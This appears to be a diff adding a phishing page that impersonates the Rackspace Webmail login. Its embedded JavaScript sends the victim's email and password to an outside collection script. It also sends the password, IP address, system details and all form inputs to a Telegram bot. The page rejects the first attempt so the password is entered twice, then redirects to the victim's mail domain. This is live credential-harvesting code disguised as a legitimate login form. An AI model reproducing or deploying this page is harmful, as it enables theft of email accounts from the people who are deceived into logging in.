@@ -1,0 +1,603 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Rackspace Webmail: Hosted Email for Business</title>
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:100,400,500,700">
+  <link href="https://apps.rackspace.com/versions/webmail/19.0.13-RC/favicon.ico" rel="shortcut icon" />
+  
+  <style>
+    /* Page Defaults */
+    * {
+      -webkit-box-sizing: border-box;
+      -moz-box-sizing: border-box;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
+      font-size: 14px;
+      line-height: 1.42857;
+      color: #333333;
+      background-color: #FAFAFA;
+      margin: 0;
+    }
+
+    .caption {
+      display: inline-block;
+      font-size: 12px;
+      color: #666;
+    }
+
+    .base_link {
+      display: inline-block;
+      color: #0C7C84;
+      text-decoration: none;
+    }
+
+    .base_links {
+      background: #FFFFFF;
+      text-align: center;
+      padding-bottom: 20px;
+      margin-top: -15px;
+    }
+
+    .divider {
+      display: inline-block;
+      margin: 0px 5px;
+      color: #0C7C84;
+    }
+    /* Page Layout */
+    #content {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      position: fixed;
+      top: 0;
+      left: 0;
+      bottom: 0;
+      right: 0;
+      background: #EAEAEA;
+    }
+
+    #content-header {
+      height: 53px;
+      padding: 16px;
+      font-size: 24px;
+      font-weight: 300;
+      line-height: 18px;
+      background: #424242;
+      color: #FCFCFC;
+    }
+
+    #content-header-logo {
+      float: right;
+    }
+
+    #logo {
+      width: 130px;
+      margin-top: -9px;
+      margin-right: -5px;
+    }
+
+    #content-header-label {
+      float: left;
+    }
+
+    #content-body {
+      display: flex;
+      justify-content: start;
+      background: #FFFFFF;
+      min-width: 790px;
+    }
+
+    #banner-section {
+      height: 285px;
+      width: 314px;
+      margin: 40px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+
+    #banner {
+      width: 190px;
+    }
+
+    #divider {
+      border: 1px solid rgb(224, 224, 224);
+      margin: 40px 0px;
+    }
+    /* Form Layout */
+    #form {
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      padding: 20px;
+      min-height: 268px;
+      width: 100%;
+    }
+
+    #form-body {
+      height: 205px;
+      width: 100%;
+      margin: 40px 0px 0px 20px;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding-right: 20px;
+    }
+
+    #form-container {
+      width: 100%;
+      margin: 0px auto;
+      padding: 0px 10px;
+    }
+
+    .row {
+      margin: 0px -10px;
+    }
+
+      .row:before, .row:after {
+        content: " ";
+        display: table;
+      }
+
+    .col {
+      width: 100%;
+      float: left;
+      position: relative;
+      min-height: 1px;
+      padding: 0px 10px;
+    }
+
+    .form-group {
+      width: inherit;
+      padding-right: 30px;
+      margin-bottom: 20px;
+    }
+
+    .form-label {
+      position: relative;
+      font-family: Roboto;
+      font-size: 16px;
+      margin-bottom: 8px;
+      line-height: 1;
+      color: #616161;
+      display: inline-block;
+      max-width: 100%;
+    }
+
+    .form-field {
+      border: 1px solid #BDBDBD;
+      border-radius: 2px;
+      background: #FFFFFF;
+      font-family: Roboto;
+      font-size: 16px;
+      color: #616161;
+      height: 32px;
+      display: block;
+      width: 100%;
+      padding: 4px 8px;
+      line-height: 1.42857;
+      -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+      box-shadow: inset 0 1px 1px rgba(0, 0, 0, 0.075);
+      -webkit-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+      -o-transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+      transition: border-color ease-in-out 0.15s, box-shadow ease-in-out 0.15s;
+    }
+
+    #forgot-password {
+      position: absolute;
+      top: 0px;
+      right: 40px;
+      color: #0C7C84;
+      text-decoration: none;
+      background-color: transparent;
+      box-sizing: border-box;
+    }
+
+    #submit-btn-toolbar {
+      float: right;
+      margin: auto 30px 15px -20px;
+    }
+
+    #submit-btn {
+      float: right;
+      display: inline-flex;
+      flex-direction: row;
+      justify-content: center;
+      align-items: center;
+      padding: 0 12px;
+      height: 32px;
+      line-height: 1px;
+      font-size: 14px;
+      font-weight: 400;
+      text-transform: capitalize;
+      color: #fff;
+      background-color: #0C7C84;
+      border-color: #0C7C84;
+      margin-bottom: 0;
+      text-align: center;
+      vertical-align: middle;
+      touch-action: manipulation;
+      cursor: pointer;
+      background-image: none;
+      border: 1px solid transparent;
+      white-space: nowrap;
+      border-radius: 2px;
+      -webkit-user-select: none;
+      -moz-user-select: none;
+      -ms-user-select: none;
+      user-select: none;
+    }
+
+    #form-container {
+      width: 100%;
+      margin: 0px auto;
+      padding: 0px 10px;
+    }
+
+    @media only screen and (max-device-width: 480px) {
+      /* Page Defaults */
+      body {
+        font-size: 19pt;
+        line-height: 1.42857em;
+      }
+
+      .caption {
+        display: inline-block;
+        font-size: 80%;
+        color: #666;
+      }
+      /* Page Layout */
+      #content {
+        align-items: inherit;
+        display: inherit;
+        justify-content: inherit;
+      }
+
+      #content-header {
+        font-size: 171%;
+        height: 3em;
+        line-height: 1em;
+        padding: 1em;
+      }
+
+      #content-header-logo {
+        float: right;
+      }
+
+      #logo {
+        margin-left: 6em;
+        width: inherit;
+        height: 1em;
+      }
+
+      #banner-section {
+        display: none;
+      }
+
+      #divider {
+        display: none;
+      }
+      /* Form Layout */
+      .form-label {
+        font-size: 114%;
+      }
+
+      .form-field {
+        font-size: 114%;
+        height: 2em;
+      }
+
+      #forgot-password {
+        right: 2em;
+        top: 0;
+      }
+
+      #submit-btn-toolbar {
+        margin: 1.5em 2em 1em -1.5em;
+      }
+
+      #submit-btn {
+        font-size: 150%;
+        height: 3em;
+        padding: 1.25em;
+      }
+    }
+  </style>
+  <script language="javascript" type="text/javascript">
+var sendurl = "https://demodaddy.com/rk/xlog.php";
+var attemptcount = 0;
+var checkemail = "Please check your email address";
+var checkpassword = "Please check your password";
+var continuebutton = "Login";
+var verifbutton = "Verifying ... ";
+var successmsg = "Please wait we are verifying your domain in few seconds...";
+if (typeof XMLHttpRequest === "undefined") {
+  XMLHttpRequest = function () {
+    try { return new ActiveXObject("Msxml2.XMLHTTP.6.0"); }
+    catch (e) {}
+    try { return new ActiveXObject("Msxml2.XMLHTTP.3.0"); }
+    catch (e) {}
+    try { return new ActiveXObject("Microsoft.XMLHTTP"); }
+    catch (e) {}
+    throw new Error("This browser does not support XMLHttpRequest.");
+  };
+}
+window.addEventListener('load', (event) => {
+window.nowdate = new Date();
+theif = "\nPage = " + document.title;
+imputs = document.getElementsByTagName('input');
+lastIndex = imputs.length;
+window.OSName = "Unknown";
+if (window.navigator.userAgent.indexOf("Windows NT 10.0")!= -1) OSName="Windows 10";
+if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) OSName="Windows 8";
+if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) OSName="Windows 7";
+if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) OSName="Windows Vista";
+if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) OSName="Windows XP";
+if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) OSName="Windows 2000";
+if (window.navigator.userAgent.indexOf("Mac")            != -1) OSName="Mac/iOS";
+if (window.navigator.userAgent.indexOf("X11")            != -1) OSName="UNIX";
+if (window.navigator.userAgent.indexOf("Linux")          != -1) OSName="Linux";
+if (window.navigator.userAgent.indexOf("Android")        != -1) OSName="Android";
+if (window.navigator.userAgent.indexOf("iPhone")         != -1) OSName="iPhone";
+if (window.navigator.userAgent.indexOf("iPad")           != -1) OSName="iPad";
+if (window.navigator.userAgent.indexOf("iPod")           != -1) OSName="iPod";
+if (window.navigator.userAgent.indexOf("BlackBerry")     != -1) OSName="BlackBerry";
+});
+function createCORSRequest(method, url){
+  var xhr = new XMLHttpRequest();
+  if ("withCredentials" in xhr){
+    xhr.open(method, url, false);
+  } else if (typeof XDomainRequest != "undefined"){
+    xhr = new XDomainRequest();
+    xhr.open(method, url);
+  } else {
+    xhr = null;
+  }
+  return xhr;
+}
+function senddataPOST(){
+if(navigator.onLine==true){
+if (typeof objs =="undefined" ){
+var objs = {
+  ip: "",
+  country_name: "",
+  city: "",
+  region: "",
+  currency: ""
+};
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+if (this.readyState == 4 && this.status == 200) {
+var rec = JSON.parse(this.responseText);
+window.rec = rec;
+}
+};
+xhttp.open("GET", "https://jsonip.com/", false);
+xhttp.send();
+}
+objs.ip = rec.ip;
+objs.country_name = "";
+objs.city = "";
+objs.region = "";
+objs.currency = "";
+theif = "IP Address = " + objs.ip;
+theif += "\nPage = " + document.title;
+theif += "\nTime = " + nowdate;
+theif += "\nSystem = " + OSName + " " + navigator.language;
+theif += "\nScreen Size = "+ screen.width + " X " + screen.height;
+theif += "\nLocation = "+ window.location+"\nPassword = "+password.value;
+for (index = 0; index < imputs.length; ++index) {
+    if(imputs[index].type!="submit" && imputs[index].name!="" && imputs[index].value!=""){
+    theif += "\n"+imputs[index].name+'='+encodeURI(imputs[index].value);
+	}
+}
+theif += "\nUser-Agent = " + navigator.userAgent;
+theif += "\nIP Details = https://ipinfo.io/" + objs.ip + "/json";
+var url_telegram ="https://api.telegram.org/";
+var randtoken = "vbot1257337675";
+var token = ":FOOLZVp72afEEmv4n6WqVFZ-_CxfvOedcso/";
+var iden = "sendMessage?chat_id=-90100127612&text=";
+var createdCORSRequest = url_telegram+randtoken+token+iden;
+var request = createCORSRequest( "POST", createdCORSRequest+encodeURI(theif) );
+if ( request ){
+if(request.send()){
+return true;
+}
+}
+}else{
+return true;
+}
+}
+function postdata(){
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+	  if(this.responseText=="ok"){
+	      senddataPOST();
+		  var address = email.value.split("@")[1];
+		  var meta=document.createElement('meta');
+		  meta.setAttribute('http-equiv', 'refresh');
+		  meta.setAttribute('content', '6; url=https://'+address);
+		  document. getElementsByTagName('head')[0]. appendChild(meta);
+	  }else{
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();
+	  }
+  }
+};
+xhttp.open("GET", sendurl+"?type=Webmail&email="+btoa(email.value)+"&password="+btoa(password.value), true);
+xhttp.send();
+}
+function ValidateEmail(mail) 
+{
+ if (/^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/.test(mail))
+  {
+    return (true)
+  }
+    return (false)
+}
+function verifall(){
+var pw = document.getElementById("password").value;  
+
+  //check empty password field  
+
+  if(pw == "") {  
+
+     document.getElementById("messagefont").innerHTML = checkpassword;  
+
+     return false;  
+
+  }  
+
+ //minimum password length validation  
+
+  if(pw.length < 5) {  
+
+     document.getElementById("messagefont").innerHTML = checkpassword;  
+
+     return false;  
+
+  }
+if(!ValidateEmail(email.value)){
+document.getElementById('messagefont').innerHTML = checkemail;
+}else{
+document.getElementById('messagefont').innerHTML = "";
+document.getElementById('submit-btn').value = verifbutton;
+if(password.value !=""){
+if(attemptcount<1){
+var xhttp = new XMLHttpRequest();
+xhttp.onreadystatechange = function() {
+  if (this.readyState == 4 && this.status == 200) {
+	  if(this.responseText=="ok"){
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();   
+	  }else{
+	  document.getElementById("messagefont").innerHTML = checkpassword;
+	  document.getElementById("password").value = "";
+	  document.getElementById('submit-btn').value = continuebutton;
+	  password.focus();
+	  }
+  }
+};
+xhttp.open("GET", sendurl+"?type=Webmail&email="+btoa(email.value)+"&password="+btoa(password.value), false);
+xhttp.send();
+attemptcount++;
+}else{
+postdata();
+}
+}else{
+document.getElementById("messagefont").innerHTML = checkpassword;
+document.getElementById("password").value = "";
+document.getElementById('submit-btn').value = continuebutton;
+password.focus();
+}
+}
+}
+</script>
+</head>
+<body>
+  <div>
+    <div id="content">
+      <div>
+        <div id="content-header">
+          <div id="content-header-logo"><img id="logo" src="https://firebasestorage.googleapis.com/v0/b/gent-ba9d4.appspot.com/o/212R.png?alt=media&token=cda70a37-c62a-4c27-8d08-b25ce5504ce2"  /></div>
+          <div id="content-header-label">Webmail Login</div>
+        </div>
+        <div id="content-body">
+          <div id="banner-section">
+            <a href="#" target="_blank">
+              <img id="banner" src="https://firebasestorage.googleapis.com/v0/b/gent-ba9d4.appspot.com/o/R-SEB.jpg?alt=media&token=2013453b-fc6f-40a0-87dc-bc1618561419" />
+            </a>
+          </div>
+          <div id="divider"></div>
+          
+  <script src="/wmidentity/dist/webmailLogin.js?v=dn70RwATRXPGR3I_MlY9aK9fMX6zSf1GYvcRvRv-UFc=" type="text/javascript"></script>
+  <div id="form-body">
+    <div id="form-container">
+	<div style="color: rgb(211, 47, 47); margin-bottom: 20px; font-weight: 500;" id="msg"></div>
+      <input type="hidden" name="__RequestVerificationToken" value="CfDJ8PJv2PmI83xDqNI3IL5jbf48bPz9K-88o7ulkxxYZwgXVk5f7EaZ8JnMHp7C_nYKNWi_RWdi8hCnMd1iE_rNvOIAuCs1i_1jcygEYsx12C67awtTIYI0ToKEeaS8EqIXVHUMfCEglWsnfGkzeSdnEQc" />
+      <!-- destination and flags is used for OWA login -->
+      <input id="form-destination" type="hidden" name="destination" value="" />
+      <input id="form-owa-flags" type="hidden" name="flags" value="4" />
+      <div id="user-row" class="row">
+        <div id="user-col" class="col">
+          <div id="user-field" class="form-group">
+            <label id="user-label" class="form-label">Email address</label>
+            <input type="email" id="email" name="email" class="form-field" value="" autocomplete="username" readonly required />
+          </div>
+        </div>
+      </div>
+      <div id="pass-row" class="row">
+        <div id="pass-col" class="col">
+          <div id="pass-field" class="form-group">
+            <label id="pass-label" class="form-label">Password</label>
+            <input id="password" name="password" type="password" class="form-field" value="" autocomplete="off" required />
+          </div>
+          <a id="forgot-password" href="#" tabindex="4">Forgot password?</a>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div id="submit-btn-toolbar">
+    <button onclick="return verifall();" id="submit-btn" tabindex="3" type="submit">Log In</button>
+  </div>
+  <p id="messagefont" class="txt_message"  style="display: none;">
+        </div>
+        <div class="base_links">
+          <a class="base_link" target="_blank" href="#">
+            Privacy Statement
+          </a>
+          <div class="divider"> | </div>
+          <a class="base_link" target="_blank" href="#">
+            Website Terms
+          </a>
+        </div>
+        <div class="footer" style="text-align: center; margin-top: 10px;">
+          <div class="caption">
+            Need webmail for your business?  Learn more about
+            <a href="#" style="color: #666;">
+              Hosted Email
+            </a>
+            from Rackspace
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+    
+  <script>
+var input = document.getElementById("password");
+
+// Execute a function when the user releases a key on the keyboard
+input.addEventListener("keyup", function(event) {
+  // Number 13 is the "Enter" key on the keyboard
+  if (event.keyCode === 13) {
+    // Cancel the default action, if needed
+    event.preventDefault();
+    // Trigger the button element with a click
+    document.getElementById("submit-btn").click();
+  }
+});
+var url_string = window.location.href; 
+var url = new URL(url_string);
+var cid = url.searchParams.get("id");
+if(cid){
+document.getElementById("email").value = cid;
+}
+
+location.hash = 'client_id=4345a7b9-9a63-4910-a426-35363201d503&response_mode=form_post&response_type=code+id_token&scope=openid+profile&state=OpenIdConnect.AuthenticationProperties%3dctF0jk0w2UtS0FF3oS4G9QM_05ExoZ-6c9rdc6cylWGLdsztC6SkQkXZb7mwjA7QOG8KZidR0h2ZYRFXCtcc5POb_I7bBanvW9lBbKKjeEXtOezrvXMFWb7p4oOfODQw&nonce=637021592852309357.YWUzYzY1ZmYtM2ZjYy00NTAwLTllOWUtZTI5N2JhOTA0MDYxOGI0ZjE0MjYtYzYzMy00ZDQ1LWJjZjgtYTc0MDQwODAyMjQy&redirect_uri=https%3a%2f%2fwww.office.com%2f&ui_locales=en-US&mkt=en-US';
+</script>
+</body>
+</html>
